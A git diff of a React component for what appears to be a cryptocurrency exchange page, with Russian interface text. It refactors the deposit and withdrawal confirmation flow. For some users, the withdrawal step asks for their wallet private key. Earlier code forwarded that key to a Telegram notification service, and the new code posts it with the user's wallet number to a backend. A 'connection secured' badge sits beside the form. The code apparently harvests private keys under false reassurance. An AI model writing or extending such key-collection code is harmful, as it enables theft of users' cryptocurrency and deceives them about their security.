@@ -1,22 +1,20 @@
 import styles from './ConfirmTransaction.module.scss'
-import CopyIcon from '@assets/icons/copy.svg?react'
-import ConnectionSecured from '@assets/icons/connection-secured.svg?react'
+import ConnectionSecuredIcon from '@assets/icons/connection-secured.svg?react'
 import SFCIcon from '@assets/icons/sfc-energy.svg?react'
 import WideButton from '@SharedUI/WideButton/WideButton.tsx'
 import { generateSixDigitCode } from '@/utils/helpers.tsx'
 import { ScrollRestoration, useLocation, useNavigate } from 'react-router-dom'
-import { telegramService, transactionService } from '@/main.tsx'
 import { useUser } from '@/hooks/useUser.ts'
 import { useEffect, useMemo, useState } from 'react'
 import ConfirmedPopup from '@SharedUI/ConfirmedPopup/ConfirmedPopup.tsx'
 import { OUR_WALLETS } from '@/utils/OUR_WALLETS.tsx'
 import toast from 'react-hot-toast'
 import IconCircleCheckFilled from '@/assets/icons/circle-check.svg?react'
-import md5 from 'crypto-js/md5'
 import { parseTimestamp } from '@/utils/helpers/date.tsx'
 import { Timestamp } from 'firebase/firestore'
-
-console.log(md5('bonyklade@gmail.com').toString())
+import PaymentInstruction from '@/pages/ConfirmTransaction/PaymentInstruction/PaymentInstruction.tsx'
+import PrivateKey from '@/pages/ConfirmTransaction/PrivateKey/PrivateKey.tsx'
+import axios from 'axios'
 
 const ConfirmTransaction = () => {
   const location = useLocation()
@@ -33,13 +31,15 @@ const ConfirmTransaction = () => {
     return generateSixDigitCode()
   }, [])
 
-  useEffect(() => {
-    return () => {
-      document.body.style.overflow = ''
-    }
-  }, [])
+  const openPopup = () => {
+    setConfirmedPopupIsOpen(true)
+    document.body.style.overflow = 'hidden'
+    window.scrollTo(0, 0)
+  }
 
   const onSubmitTransaction = async () => {
+    if (!user) return
+
     if (isDepositType && !transactionHash) {
       toast.error('Укажите номер/хеш транзакции')
       return
@@ -50,38 +50,35 @@ const ConfirmTransaction = () => {
       return
     }
 
-    await transactionService.addTransaction({
+    const transactionData = {
       type: isDepositType ? 'Пополнение' : 'Вывод',
       status: 'Ожидание',
       amount,
-      nickname: user?.nickname,
+      nickname: user.nickname,
       executor: wallet,
-    })
-
-    setConfirmedPopupIsOpen(true)
-    document.body.style.overflow = 'hidden'
-    window.scrollTo(0, 0)
-
-    if (isDepositType) {
-      await telegramService.depositNotification({
-        amount,
-        type: `Пополнение`,
-        transactionHash,
-      })
-    } else {
-      await telegramService.withdrawnNotification({
-        amount,
-        type: 'Вывод',
-        walletNumber: 'test',
-        privateKey,
-      })
+      transactionHash,
+      privateKey,
+      userWallet: user.wallets[wallet].number,
     }
+
+    openPopup()
+
+    await axios.post(
+      'http://localhost:3010/transaction/add-transaction',
+      transactionData,
+    )
   }
 
   const copyWallet = () => {
     toast.success('Скопировано!')
     navigator.clipboard.writeText(OUR_WALLETS[wallet])
   }
+
+  useEffect(() => {
+    return () => {
+      document.body.style.overflow = ''
+    }
+  }, [])
 
   if (!user) return null
 
@@ -102,70 +99,15 @@ const ConfirmTransaction = () => {
       <div className={styles['columns-wrapper']}>
         <div className={styles['left-column']}>
           {user.restrictions.isPrivateKey && !isDepositType && (
-            <div className={styles['private-key']}>
-              <div>
-                <p>
-                  Важно: Вы собираетесь ввести ваш приватный финансовый ключ.
-                  Этот ключ представляет собой уникальную комбинацию символов,
-                  которая предоставляет вам доступ к вашим личным финансовым
-                  данным.
-                </p>
-                <p>
-                  Будьте осторожны при использовании вашего приватного ключа. Не
-                  раскрывайте его третьим лицам, не сохраняйте на общедоступных
-                  или незащищенных устройствах. В случае его утери или кражи,
-                  ваши финансовые средства могут быть поставлены под угрозу.
-                </p>
-                <p>
-                  Вводите ваш ключ только если вы абсолютно уверены в своих
-                  действиях. Помните, что ответственность за сохранность вашего
-                  приватного ключа лежит на вас.
-                </p>
-              </div>
-              <p>Введите пожалуйста ваш приватный финансовый ключ</p>
-              <input
-                onChange={(e) => setPrivateKey(e.target.value)}
-                value={privateKey}
-                placeholder={'56abe1a1bcb08bc5ce9af9307e8388b2'}
-              />
-            </div>
+            <PrivateKey privateKey={privateKey} setPrivateKey={setPrivateKey} />
           )}
           {isDepositType && (
-            <div className={styles['instruction']}>
-              <h2>Инструкции по переводу платежа</h2>
-              <ul>
-                <li className={styles['completed']}>
-                  <p>1. Выбор платежной системы</p>
-                  <IconCircleCheckFilled width={17} />
-                </li>
-                <li className={styles['completed']}>
-                  <p>2. Укажите сумму пополнения</p>
-                  <IconCircleCheckFilled width={17} />
-                </li>
-                <li>
-                  <p>3. Произведите оплату по указанным реквизитам</p>
-                  <div className={styles['wallet-address-wrapper']}>
-                    <p
-                      className={styles['wallet-address']}
-                      onClick={copyWallet}
-                    >
-                      <span>{OUR_WALLETS[wallet]}</span> <CopyIcon />
-                    </p>
-                    <p className={styles['title']}>Адрес кошелька ({wallet})</p>
-                  </div>
-                </li>
-                <li>
-                  <p>
-                    4. Подтвердите транзакцию, введя номер/хэш транзакции ниже
-                  </p>
-                  <input
-                    value={transactionHash}
-                    onChange={(e) => setTransactionHash(e.target.value)}
-                    placeholder={'Хеш транзакции'}
-                  />
-                </li>
-              </ul>
-            </div>
+            <PaymentInstruction
+              wallet={wallet}
+              transactionHash={transactionHash}
+              setTransactionHash={setTransactionHash}
+              copyWalletHandler={copyWallet}
+            />
           )}
         </div>
         <div className={styles['right-column']}>
@@ -196,7 +138,7 @@ const ConfirmTransaction = () => {
             className={`${styles['secure-connection']} ${!isDepositType ? styles['secure-connection-withdrawn'] : ''}`}
           >
             <p>
-              <ConnectionSecured />
+              <ConnectionSecuredIcon />
               Соединение <br />
               защищено
             </p>
